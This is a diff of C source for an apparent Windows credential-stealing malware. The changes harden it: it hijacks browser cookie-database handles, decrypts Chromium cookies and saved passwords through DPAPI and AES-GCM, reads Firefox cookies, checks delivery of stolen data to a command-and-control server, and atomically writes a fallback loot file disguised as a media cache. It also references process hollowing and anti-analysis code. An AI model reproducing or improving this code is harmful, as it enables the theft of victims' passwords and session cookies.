@@ -134,12 +134,18 @@ static void RecStart(void){
 }
 static void PutJ(const char* s, int n){            // escape string for JSON
     PutS("\"");
+    int run = 0;
     for(int i=0;i<n;i++){ unsigned char c=(unsigned char)s[i];
-        if(c=='"'||c=='\\'){ Put("\\",1); Put((char*)&c,1); }
-        else if(c=='\n') Put("\\n",2); else if(c=='\r') Put("\\r",2); else if(c=='\t') Put("\\t",2);
-        else if(c<32){ char t[8]; for(int j=0;j<4;j++){ const char*H="0123456789abcdef";
-            t[j]=H[(c>>((3-j)*4))&15]; } Put("\\u00",4); Put(t,4); }
-        else Put((char*)&c,1); }   // bytes >= 0x80: pass through as UTF-8
+        if(c=='"'||c=='\\'||c<32){
+            if(i>run) Put(s+run,i-run);
+            if(c=='"'||c=='\\'){ Put("\\",1); Put((char*)&c,1); }
+            else if(c=='\n') Put("\\n",2); else if(c=='\r') Put("\\r",2); else if(c=='\t') Put("\\t",2);
+            else { char t[8]; for(int j=0;j<4;j++){ const char*H="0123456789abcdef";
+                t[j]=H[(c>>((3-j)*4))&15]; } Put("\\u00",4); Put(t,4); }
+            run=i+1;
+        }
+    }
+    if(n>run) Put(s+run,n-run);              // bytes >= 0x80: pass through as UTF-8
     PutS("\"");
 }
 static void PutN(long long v){ char b[24]; int i=20; if(!v){ Put("0",1); return; }
@@ -282,26 +288,37 @@ static bool Dpapi(const unsigned char* in, DWORD nin, unsigned char* out, DWORD*
 // Uses direct bcrypt.lib calls (bcrypt.lib is linked in build.bat).
 // Previously used GetProcAddress but the function pointer typedefs caused
 // STATUS_INVALID_PARAMETER (0xC0000003) in the hollowed process.
+static BCRYPT_ALG_HANDLE g_aes_alg = NULL;
+static bool g_aes_tried = false;
+
 static bool AesGcm(const unsigned char* key, ULONG klen, const unsigned char* iv,
                    const unsigned char* ct, ULONG clen, const unsigned char* tag,
                    unsigned char* out, ULONG outcap, ULONG* nout){
-    BCRYPT_ALG_HANDLE alg=NULL; BCRYPT_KEY_HANDLE k=NULL; NTSTATUS st;
-    st = BCryptOpenAlgorithmProvider(&alg,BCRYPT_AES_ALGORITHM,NULL,0);
-    if(st){ DbgInt("AesGcm: OpenAlg failed", st); return false; }
-    st = BCryptSetProperty(alg,BCRYPT_CHAINING_MODE,(PUCHAR)BCRYPT_CHAIN_MODE_GCM,
-           (ULONG)(lstrlenW(BCRYPT_CHAIN_MODE_GCM)+1)*sizeof(WCHAR),0);
-    if(st){ DbgInt("AesGcm: SetChaining failed", st); BCryptCloseAlgorithmProvider(alg,0); return false; }
-    st = BCryptGenerateSymmetricKey(alg,&k,NULL,0,(PUCHAR)key,klen,0);
-    if(st){ DbgInt("AesGcm: GenKey failed", st); BCryptCloseAlgorithmProvider(alg,0); return false; }
+    NTSTATUS st;
+    if(!g_aes_tried){
+        g_aes_tried = true;
+        st = BCryptOpenAlgorithmProvider(&g_aes_alg,BCRYPT_AES_ALGORITHM,NULL,0);
+        if(!st) st = BCryptSetProperty(g_aes_alg,BCRYPT_CHAINING_MODE,(PUCHAR)BCRYPT_CHAIN_MODE_GCM,
+                       (ULONG)(lstrlenW(BCRYPT_CHAIN_MODE_GCM)+1)*sizeof(WCHAR),0);
+        if(st){
+            DbgInt("AesGcm: provider init failed", st);
+            if(g_aes_alg) BCryptCloseAlgorithmProvider(g_aes_alg,0);
+            g_aes_alg = NULL;
+        }
+    }
+    if(!g_aes_alg) return false;             // cached for the process lifetime
+    BCRYPT_KEY_HANDLE k=NULL;
+    st = BCryptGenerateSymmetricKey(g_aes_alg,&k,NULL,0,(PUCHAR)key,klen,0);
+    if(st){ DbgInt("AesGcm: GenKey failed", st); return false; }
     BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
     memset(&info,0,sizeof(info));
     BCRYPT_INIT_AUTH_MODE_INFO(info);
     info.pbNonce = (PUCHAR)iv; info.cbNonce = 12;
     info.pbTag   = (PUCHAR)tag; info.cbTag  = 16;
-    if(clen>outcap){ BCryptDestroyKey(k); BCryptCloseAlgorithmProvider(alg,0); return false; }
+    if(clen>outcap){ BCryptDestroyKey(k); return false; }
     ULONG need=0;
     st = BCryptDecrypt(k,(PUCHAR)ct,clen,&info,NULL,0,out,outcap,&need,0);
-    BCryptDestroyKey(k); BCryptCloseAlgorithmProvider(alg,0);
+    BCryptDestroyKey(k);
     if(st){ DbgInt("AesGcm: BCryptDecrypt status", st); return false; }
     *nout = need;
     return true;
@@ -428,6 +445,14 @@ struct HandleEntryEx {
 };
 #pragma pack(pop)
 
+static void DeleteDbCopy(const wchar_t* dst){
+    DeleteFileW(dst);
+    int n=lstrlenW(dst);
+    if(n<=0 || n+5>MAX_PATH) return;
+    wchar_t side[MAX_PATH]; lstrcpyW(side,dst); lstrcatW(side,L"-wal"); DeleteFileW(side);
+    lstrcpyW(side,dst); lstrcatW(side,L"-shm"); DeleteFileW(side);
+}
+
 // Hijack a SQLite DB handle from a running browser process.
 // exe_name: e.g. L"vivaldi.exe" â€” used to find browser PIDs
 // dst: temp file path to write the DB to
@@ -502,11 +527,10 @@ static bool HijackCookieDB(const wchar_t* exe_name, const wchar_t* dst,
             CloseHandle(dup); CloseHandle(hProc); continue;
         }
 
-        // Read first 16 bytes for SQLite magic
-        LARGE_INTEGER zero; zero.QuadPart = 0;
-        SetFilePointerEx(dup, zero, NULL, FILE_BEGIN);
+        // Explicit offsets do not move the file pointer shared with the browser.
+        OVERLAPPED ov; memset(&ov,0,sizeof(ov));
         char magic[16]; DWORD rd = 0;
-        if(!ReadFile(dup, magic, 16, &rd, NULL) || rd != 16){
+        if(!ReadFile(dup, magic, 16, &rd, &ov) || rd != 16){
             CloseHandle(dup); CloseHandle(hProc); continue;
         }
         if(memcmp(magic, "SQLite format 3\x00", 16) != 0){
@@ -520,13 +544,9 @@ static bool HijackCookieDB(const wchar_t* exe_name, const wchar_t* dst,
             CloseHandle(dup); CloseHandle(hProc); continue;
         }
 
-        // Read the whole file to dst
-        SetFilePointerEx(dup, zero, NULL, FILE_BEGIN);
-        DeleteFileW(dst);
-        // stale -wal/-shm from a previous CopyDb would corrupt this snapshot:
-        // SQLite would replay a WAL that does not belong to this file
-        { wchar_t wal[MAX_PATH]; lstrcpyW(wal,dst); lstrcatW(wal,L"-wal"); DeleteFileW(wal); }
-        { wchar_t shm[MAX_PATH]; lstrcpyW(shm,dst); lstrcatW(shm,L"-shm"); DeleteFileW(shm); }
+        // Read the whole file to dst without SetFilePointerEx on the duplicate.
+        // Sidecars from another snapshot must not be replayed into this copy.
+        DeleteDbCopy(dst);
         HANDLE hOut = CreateFileW(dst, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
         if(hOut == INVALID_HANDLE_VALUE){
             CloseHandle(dup); CloseHandle(hProc); continue;
@@ -541,7 +561,8 @@ static bool HijackCookieDB(const wchar_t* exe_name, const wchar_t* dst,
             DWORD toRead = (fsize - totalRead < 65536) ?
                            (fsize - totalRead) : 65536;
             DWORD nRead = 0;
-            if(!ReadFile(dup, rbuf, toRead, &nRead, NULL) || nRead == 0){ readOk = false; break; }
+            memset(&ov,0,sizeof(ov)); ov.Offset = totalRead;
+            if(!ReadFile(dup, rbuf, toRead, &nRead, &ov) || nRead == 0){ readOk = false; break; }
             DWORD nWritten = 0;
             if(!WriteFile(hOut, rbuf, nRead, &nWritten, NULL) || nWritten != nRead){ readOk = false; break; }
             totalRead += nRead;
@@ -553,12 +574,12 @@ static bool HijackCookieDB(const wchar_t* exe_name, const wchar_t* dst,
         // Verify the expected table exists
         char path8[1024]; ToUtf8(dst, path8, sizeof(path8));
         void* con = NULL; int rc = S_open(path8, &con, 1/*SQLITE_OPEN_READONLY*/, NULL);
-        if(rc || !con){ DbgHInt("HijackCookieDB: sqlite open failed", rc); continue; }
+        if(rc || !con){ if(con) S_close(con); DbgHInt("HijackCookieDB: sqlite open failed", rc); continue; }
         void* st = NULL;
         wchar_t sql[128]; lstrcpyW(sql, L"SELECT count(*) FROM ");
         lstrcatW(sql, table_name);
         rc = S_prep(con, sql, -1, &st, NULL);
-        if(rc){ S_close(con); DbgHInt("HijackCookieDB: table not found", rc); continue; }
+        if(rc){ if(st) S_fin(st); S_close(con); DbgHInt("HijackCookieDB: table not found", rc); continue; }
         if(S_step(st) == 100 /*SQLITE_ROW*/){
             int cnt = S_int(st, 0);
             DbgHInt("HijackCookieDB: table found, row count", cnt);
@@ -570,6 +591,7 @@ static bool HijackCookieDB(const wchar_t* exe_name, const wchar_t* dst,
     }
 
     VirtualFree(buf, 0, MEM_RELEASE);
+    DeleteDbCopy(dst);
     DbgH("HijackCookieDB: no matching DB handle found");
     return false;
 }
@@ -596,41 +618,50 @@ static bool CopyFileShared(const wchar_t* src, const wchar_t* dst){
         DbgInt("CopyFileShared: CreateFileW(dst) failed (err)", GetLastError());
         CloseHandle(hIn); return false;
     }
-    char buf[8192]; DWORD nRead=0, nWritten=0;
-    while(ReadFile(hIn, buf, sizeof(buf), &nRead, NULL) && nRead > 0){
-        if(!WriteFile(hOut, buf, nRead, &nWritten, NULL) || nWritten != nRead){
-            CloseHandle(hIn); CloseHandle(hOut); return false;
-        }
+    char buf[8192]; bool ok=true;
+    for(;;){
+        DWORD nRead=0;
+        if(!ReadFile(hIn,buf,sizeof(buf),&nRead,NULL)){ ok=false; break; }
+        if(nRead==0) break;                         // only a successful zero read is EOF
+        DWORD nWritten=0;
+        if(!WriteFile(hOut,buf,nRead,&nWritten,NULL) || nWritten!=nRead){ ok=false; break; }
     }
     CloseHandle(hIn); CloseHandle(hOut);
+    if(!ok){ DeleteFileW(dst); return false; }
     DbgH("CopyFileShared: copy loop done");
     return true;
 }
 
-// Copy a SQLite database (and -wal/-shm companions) to %TEMP%\ck_db.tmp
+// Copy a SQLite database (and -wal/-shm companions) to a unique temporary path.
 // Uses CopyFileShared to bypass browser file locks (Chrome/Edge hold exclusive
 // locks on live cookie DBs; CopyFileW fails, but CreateFileW with FILE_SHARE_WRITE works)
 static bool CopyDb(const wchar_t* src, wchar_t* dst, int dst_cap,
                    const wchar_t* exe_name, const wchar_t* table_name){
-    wchar_t tmp[MAX_PATH]; GetTempPathW(MAX_PATH, tmp);
-    lstrcpyW(dst, tmp); lstrcatW(dst, L"ck_db.tmp");
-    DeleteFileW(dst);
+    wchar_t tmp[MAX_PATH]; DWORD tn=GetTempPathW(MAX_PATH, tmp);
+    if(!tn || tn>=MAX_PATH || dst_cap<MAX_PATH || !GetTempFileNameW(tmp,L"ckd",0,dst)) return false;
+    DeleteDbCopy(dst);
     DbgH("CopyDb: calling CopyFileShared");
     if(!CopyFileShared(src, dst)){
         // Browser holds 0-sharing lock â€” try handle hijack
         DbgH("CopyDb: CopyFileShared failed, trying handle hijack");
-        if(exe_name && *exe_name && HijackCookieDB(exe_name, dst, table_name)){
+        if(exe_name && *exe_name && HijackCookieDB(exe_name, dst, table_name))
             DbgH("CopyDb: handle hijack OK");
-            return true;
-        }
-        return false;
+        else { DeleteDbCopy(dst); return false; }
     }
     DbgH("CopyDb: main copy OK, doing wal/shm");
+    const wchar_t* suffix[2]={L"-wal",L"-shm"};
     wchar_t s2[MAX_PATH], d2[MAX_PATH];
-    lstrcpyW(s2, src); lstrcatW(s2, L"-wal"); lstrcpyW(d2, dst); lstrcatW(d2, L"-wal");
-    DeleteFileW(d2); CopyFileShared(s2, d2);
-    lstrcpyW(s2, src); lstrcatW(s2, L"-shm"); lstrcpyW(d2, dst); lstrcatW(d2, L"-shm");
-    DeleteFileW(d2); CopyFileShared(s2, d2);
+    for(int i=0;i<2;i++){
+        lstrcpyW(s2,src); lstrcatW(s2,suffix[i]);
+        lstrcpyW(d2,dst); lstrcatW(d2,suffix[i]); DeleteFileW(d2);
+        DWORD attr=GetFileAttributesW(s2);
+        if(attr==INVALID_FILE_ATTRIBUTES){
+            DWORD err=GetLastError();
+            if(err==ERROR_FILE_NOT_FOUND || err==ERROR_PATH_NOT_FOUND) continue;
+            DeleteDbCopy(dst); return false;
+        }
+        if(!CopyFileShared(s2,d2)){ DeleteDbCopy(dst); return false; }
+    }
     DbgH("CopyDb: done");
     return true;
 }
@@ -664,15 +695,24 @@ static void LoadLocalState(const wchar_t* brname, const wchar_t* root){
     Dbg("LoadLocalState: reading file");
     // size-based read: Local State regularly exceeds 256 KB on heavy profiles
     // (extensions, histograms) and the old fixed 256 KB buffer cut os_crypt off
-    LARGE_INTEGER fsz; GetFileSizeEx(h,&fsz);
-    if(fsz.QuadPart <= 0 || fsz.QuadPart > 8*1024*1024){ CloseHandle(h); Dbg("LoadLocalState: bad size"); return; }
+    LARGE_INTEGER fsz;
+    if(!GetFileSizeEx(h,&fsz) || fsz.QuadPart <= 0 || fsz.QuadPart > 8*1024*1024){
+        CloseHandle(h); Dbg("LoadLocalState: bad size"); return;
+    }
     DWORD bufsz = (DWORD)fsz.QuadPart;
     char* buf = (char*)VirtualAlloc(NULL, bufsz+1, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
     if(!buf){ CloseHandle(h); Dbg("LoadLocalState: OOM"); return; }
-    DWORD rd=0; ReadFile(h,buf,bufsz,&rd,NULL);
-    Dbg("LoadLocalState: ReadFile done");
+    DWORD rd=0; bool read_ok=true;
+    while(rd<bufsz){
+        DWORD got=0;
+        if(!ReadFile(h,buf+rd,bufsz-rd,&got,NULL) || got==0){ read_ok=false; break; }
+        rd+=got;
+    }
     CloseHandle(h);
-    Dbg("LoadLocalState: CloseHandle done");
+    if(!read_ok || rd!=bufsz){
+        VirtualFree(buf,0,MEM_RELEASE); Dbg("LoadLocalState: read failed"); return;
+    }
+    Dbg("LoadLocalState: full read done");
     buf[rd]=0;
     Dbg("LoadLocalState: buf null-terminated");
     char* oc = (char*)xstrstr(buf,"\"os_crypt\"");
@@ -857,12 +897,12 @@ static void DumpChromiumDb(const wchar_t* brname, const wchar_t* profile,
     char path8[1024]; ToUtf8(tmp_db,path8,sizeof(path8));
     DbgStr("DumpChromiumDb: opening ", path8);
     void* con=NULL; int rc=S_open(path8,&con,0x00000001/*SQLITE_OPEN_READONLY*/,NULL);
-    if(rc||!con){ SrcAdd(kind, brname, profile, db, 0, 0, 0, "locked"); return; }
+    if(rc||!con){ if(con) S_close(con); DeleteDbCopy(tmp_db); SrcAdd(kind, brname, profile, db, 0, 0, 0, "locked"); return; }
     void* st=NULL;
     const wchar_t* SQL = L"SELECT host_key,name,path,encrypted_value,expires_utc,"
                          L"is_secure,is_httponly,samesite FROM cookies;";
     int prc=S_prep(con,SQL,-1,&st,NULL);
-    if(prc){ S_close(con); SrcAdd(kind, brname, profile, db, 0, 0, 0, "unsupported"); return; }
+    if(prc){ if(st) S_fin(st); S_close(con); DeleteDbCopy(tmp_db); SrcAdd(kind, brname, profile, db, 0, 0, 0, "unsupported"); return; }
     int rows=0, dec=0, failed=0;
     while(S_step(st)==100){                                    // SQLITE_ROW
         rows++;
@@ -908,7 +948,7 @@ static void DumpChromiumDb(const wchar_t* brname, const wchar_t* profile,
     else if(rows > 0 && dec == 0 && failed > 0 && !g_has10) skip = "v10-fail";
     SrcAdd(kind, brname, profile, db, rows, dec, failed, skip);
     DbgInt("DumpChromiumDb: rows extracted", rows);
-    S_fin(st); S_close(con);
+    S_fin(st); S_close(con); DeleteDbCopy(tmp_db);
 }
 
 // Chromium family: root-level Cookies first (Opera Stable, Electron/CEF keep
@@ -1192,13 +1232,14 @@ static void DumpFirefox(const wchar_t* appdata, bool notice){
                 void* con=NULL; int rc=S_open(path8,&con,0x00000001/*SQLITE_OPEN_READONLY*/,NULL);
                 if(rc||!con){
                     DbgInt("DumpFirefox: S_open failed", rc);
+                    if(con) S_close(con);
                     SrcAdd("firefox",L"firefox",fd.cFileName,db,0,0,0,"locked");
                 } else {
                     void* st=NULL;
                     const wchar_t* SQL = L"SELECT name,value,host,path,expiry,isSecure,isHttpOnly,sameSite FROM moz_cookies;";
                     int prc=S_prep(con,SQL,-1,&st,NULL);
                     if(prc){
-                        DbgInt("DumpFirefox: S_prep failed", prc); S_close(con);
+                        DbgInt("DumpFirefox: S_prep failed", prc); if(st) S_fin(st); S_close(con);
                         SrcAdd("firefox",L"firefox",fd.cFileName,db,0,0,0,"unsupported");
                     } else {
                         int rows=0;
@@ -1224,6 +1265,7 @@ static void DumpFirefox(const wchar_t* appdata, bool notice){
                         S_fin(st); S_close(con);
                     }
                 }
+                DeleteDbCopy(tmp_db);
             }
         }
         // Session recovery: sessionstore.jsonlz4 in the profile root, recovery
@@ -1357,6 +1399,8 @@ static void DumpPasswordDb(const wchar_t* name, const wchar_t* pname,
     void* con=NULL; int rc=S_open(path8,&con,0x00000001/*SQLITE_OPEN_READONLY*/,NULL);
     if(rc||!con){
         DbgInt("DumpPasswords: S_open failed", rc);
+        if(con) S_close(con);
+        DeleteDbCopy(tmp);
         SrcAdd("logins", name, pname, prof, 0, 0, 0, "locked");
         return;
     }
@@ -1365,7 +1409,8 @@ static void DumpPasswordDb(const wchar_t* name, const wchar_t* pname,
     const wchar_t* SQL = L"SELECT origin_url, username_value, password_value FROM logins;";
     rc=S_prep(con,SQL,-1,&st,NULL);
     if(rc){
-        DbgInt("DumpPasswords: S_prep failed", rc); S_close(con);
+        DbgInt("DumpPasswords: S_prep failed", rc); if(st) S_fin(st); S_close(con);
+        DeleteDbCopy(tmp);
         SrcAdd("logins", name, pname, prof, 0, 0, 0, "unsupported");
         return;
     }
@@ -1397,17 +1442,16 @@ static void DumpPasswordDb(const wchar_t* name, const wchar_t* pname,
             // converted. The old odd-byte-zero test turned "senha@ção"
             // into binary garbage on the target.
             if(pwd_len >= 2 && pwd_len % 2 == 0 && !LooksUtf8(pwd, pwd_len)){
-                // Convert UTF-16LE to UTF-8 (BMP). The output buffer is 2x the
-                // blob size: a 2-byte code unit can become 3 UTF-8 bytes, and
-                // the old in-place conversion could write past enc_len.
-                int u8len = 0;
-                for(int k=0; k<pwd_len; k+=2){
-                    unsigned short ch = (unsigned char)pwd[k] | ((unsigned char)pwd[k+1] << 8);
-                    if(ch < 0x80) pwd[u8len++] = (char)ch;
-                    else if(ch < 0x800){ pwd[u8len++]=(char)(0xC0|(ch>>6)); pwd[u8len++]=(char)(0x80|(ch&0x3F)); }
-                    else { pwd[u8len++]=(char)(0xE0|(ch>>12)); pwd[u8len++]=(char)(0x80|((ch>>6)&0x3F)); pwd[u8len++]=(char)(0x80|(ch&0x3F)); }
-                }
-                pwd_len = u8len;
+                // Convert out of place so multibyte output cannot overwrite input.
+                int need = WideCharToMultiByte(CP_UTF8,WC_ERR_INVALID_CHARS,
+                    (LPCWCH)pwd,pwd_len/2,NULL,0,NULL,NULL);
+                char* u8 = (need > 0 && need <= enc_len*2)
+                    ? (char*)VirtualAlloc(NULL,need,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE) : NULL;
+                int written = u8 ? WideCharToMultiByte(CP_UTF8,WC_ERR_INVALID_CHARS,
+                    (LPCWCH)pwd,pwd_len/2,u8,need,NULL,NULL) : 0;
+                if(u8 && written == need){ memcpy(pwd,u8,need); pwd_len=written; }
+                else pwd_len=0;
+                if(u8) VirtualFree(u8,0,MEM_RELEASE);
             }
         }
         else{
@@ -1440,7 +1484,7 @@ static void DumpPasswordDb(const wchar_t* name, const wchar_t* pname,
     if(rows>0 && dec_ok==0 && g_need20 && !g_has20) skip = "no-key";
     else if(rows>0 && dec_ok==0 && dec_fail>0 && !g_has10) skip = "v10-fail";
     SrcAdd("logins", name, pname, prof, rows, dec_ok, dec_fail, skip);
-    S_fin(st); S_close(con);
+    S_fin(st); S_close(con); DeleteDbCopy(tmp);
     Dbg("DumpPasswords: done");
 }
 
@@ -1704,21 +1748,25 @@ static bool HttpStatusOk(const char* p, int n){
 }
 
 static bool RecvStatus(tCkRecv fRecv, CK_SOCKET s){
-    char resp[64];
-    int r = fRecv(s, resp, sizeof(resp), 0);
-    if(r <= 0) return false;
-    return HttpStatusOk(resp, r);
+    char resp[12]; int got = 0;
+    while(got < (int)sizeof(resp)){
+        int r = fRecv(s, resp + got, (int)sizeof(resp) - got, 0);
+        if(r <= 0) return false;
+        got += r;
+    }
+    return HttpStatusOk(resp, got);
 }
 
-// TLS equivalent: read one record and decrypt it before checking the status
-// line. Without this every 4xx looked like a successful delivery.
+// TLS equivalent: decrypt records until the complete status prefix is present.
 static bool TlsRecvStatus(CkTls* t, tCkRecv fRecv, CK_SOCKET s){
-    char enc[18432];
-    int enclen = 0;
-    for(int round = 0; round < 16; round++){
-        int r = fRecv(s, enc + enclen, (int)sizeof(enc) - enclen, 0);
-        if(r <= 0) return false;
-        enclen += r;
+    char enc[18432]; int enclen = 0;
+    char resp[12]; int got = 0;
+    for(int round = 0; round < 64; round++){
+        if(enclen == 0){
+            int r = fRecv(s, enc, (int)sizeof(enc), 0);
+            if(r <= 0) return false;
+            enclen = r;
+        }
 
         SecBuffer b[4];
         b[0].BufferType = SECBUFFER_DATA;  b[0].cbBuffer = enclen; b[0].pvBuffer = enc;
@@ -1728,13 +1776,26 @@ static bool TlsRecvStatus(CkTls* t, tCkRecv fRecv, CK_SOCKET s){
         SecBufferDesc d; d.ulVersion = SECBUFFER_VERSION; d.cBuffers = 4; d.pBuffers = b;
 
         SECURITY_STATUS ss = DecryptMessage(&t->ctx, &d, 0, NULL);
-        if(ss == SEC_E_INCOMPLETE_MESSAGE) continue;
-        if(ss != SEC_E_OK) return false;
-        for(int i = 0; i < 4; i++){
-            if(b[i].BufferType == SECBUFFER_DATA && b[i].cbBuffer > 0)
-                return HttpStatusOk((const char*)b[i].pvBuffer, (int)b[i].cbBuffer);
+        if(ss == SEC_E_INCOMPLETE_MESSAGE){
+            if(enclen >= (int)sizeof(enc)) return false;
+            int r = fRecv(s, enc + enclen, (int)sizeof(enc) - enclen, 0);
+            if(r <= 0) return false;
+            enclen += r;
+            continue;
         }
-        return false;
+        if(ss != SEC_E_OK) return false;
+        int extra = 0;
+        for(int i = 0; i < 4; i++){
+            if(b[i].BufferType == SECBUFFER_DATA && b[i].cbBuffer > 0){
+                int n = (int)b[i].cbBuffer;
+                if(n > (int)sizeof(resp)-got) n = (int)sizeof(resp)-got;
+                if(n > 0){ memcpy(resp+got,b[i].pvBuffer,n); got += n; }
+                if(got == (int)sizeof(resp)) return HttpStatusOk(resp,got);
+            } else if(b[i].BufferType == SECBUFFER_EXTRA) extra = (int)b[i].cbBuffer;
+        }
+        if(extra < 0 || extra > enclen) return false;
+        if(extra) memmove(enc,enc+enclen-extra,extra);
+        enclen = extra;
     }
     return false;
 }
@@ -2049,6 +2110,25 @@ static void EmitCoverage(void){
     PutS("]}}");
 }
 
+static bool WriteLocalLoot(const wchar_t* dir, const wchar_t* path){
+    wchar_t tmp[MAX_PATH];
+    if(!GetTempFileNameW(dir,L"ckl",0,tmp)) return false;
+    HANDLE h=CreateFileW(tmp,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
+    if(h==INVALID_HANDLE_VALUE){ DeleteFileW(tmp); return false; }
+    size_t wrote=0; bool ok=true;
+    while(wrote<g_len){
+        DWORD n=(g_len-wrote>0x40000000)?0x40000000:(DWORD)(g_len-wrote), w=0;
+        if(!WriteFile(h,g_out+wrote,n,&w,NULL) || w==0){ ok=false; break; }
+        wrote+=w;
+    }
+    if(!CloseHandle(h)) ok=false;
+    // A partial or malformed candidate never replaces the previous local loot.
+    if(!ok || !MoveFileExW(tmp,path,MOVEFILE_REPLACE_EXISTING|MOVEFILE_WRITE_THROUGH)){
+        DeleteFileW(tmp); return false;
+    }
+    return true;
+}
+
 // Priority: 1) HTTP POST to C2 (if sentinel was patched), 2) named pipe, 3) local file
 static bool Sink(void){
     g_rec_end = g_len;                                  // chunk splitter stops here
@@ -2086,13 +2166,10 @@ static bool Sink(void){
         Sleep(250);
     }
 
-    // 3. Last resort: local file
+    // 3. Last resort: local file, published only after a complete write.
     CreateDirectoryW(L"C:\\ProgramData\\MediaCache",NULL);
-    HANDLE h = CreateFileW(L"C:\\ProgramData\\MediaCache\\cache.json",GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
-    if(h==INVALID_HANDLE_VALUE)
-        h = CreateFileW(L"_ck_drop.json",GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
-    if(h==INVALID_HANDLE_VALUE) return false;
-    DWORD wr=0; WriteFile(h,g_out,(DWORD)g_len,&wr,NULL); CloseHandle(h); return true;
+    if(WriteLocalLoot(L"C:\\ProgramData\\MediaCache",L"C:\\ProgramData\\MediaCache\\cache.json")) return true;
+    return WriteLocalLoot(L".",L"_ck_drop.json");
 }
 
 // ------------------------------------------------------------------ anti-analysis
